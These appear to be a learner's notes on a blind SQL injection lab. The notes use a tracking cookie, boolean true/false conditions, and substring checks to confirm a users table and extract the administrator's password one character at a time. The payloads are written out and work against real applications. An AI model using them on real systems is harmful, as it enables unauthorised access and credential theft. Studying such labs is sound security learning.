Blind sqli

vulnerability on tracking cookie

confirm vulnerability

querry running in the backend
	select trackingid from tracking-table where trackingid = XggeL7VA9ray5o8o

	we get the welcome  abck message, this shows the tracking id exists in the db, if it wasnt we wouldnt get the welcome back message

	for blind sqli we will test to see if we put the wrong tracking id we will still get the welcome back message

	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and 1=1--' ->  result is true

	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and 1=0--' -> result is false

	since the result are different in both occassions this confirms that the application is vulnerable to blind sqli

confirm the users table exist
	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select 'x' from users LIMIT 1)='x'--' -> result is true, we get a wlcome back message this shows that the users table exists

confirm administrator exists in the users table
	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select username from users where username='administrator')='administrator'--'  -> evaluates to true this means the user administrator exists

getting the adminnistrator user password
	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select Ppassword from users where username='administrator')='sdfjkkjfdhgdfr'--' -> not ideal since its like brute forcing the password

	we can check first letter using all letters and numbers if its true(we get welcome back message the the letter is the first part of password)

	we can get the length first

	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--'
	checks if the lenght of the password is greater than 1
	querry returns true hence the password length is > 5

	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select username from users where username='administrator' and LENGTH(password)>30)='administrator'--' -> returns false
	if we get false(no welcome back message) it means the password lenght is less than 30 the we can use the intruder to enumerate the rest

	this means the password is greater than 1 but less than 30 we can check untill we get the right length with intruder

	from intruder we find the length of the password to be 20

	we starting with first position and only that
	------------------
	select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select substring(password,1,1) from users where username='administrator')='a'--'
	--------------------------
	   -> checking if the first char of the password is a, if there is welcome back message then the first character is a if not its not a we test b untill al the alpha numeric chars are tested, password(1,1) means we are checking for position 1 and 1 only,
	   results - false for 'a'

	   from intruder first letter is g

	   select trackingid from tracking-table where trackingid = 'XggeL7VA9ray5o8o' and (select substring(password,1,1) from users where username='administrator')='g'--'
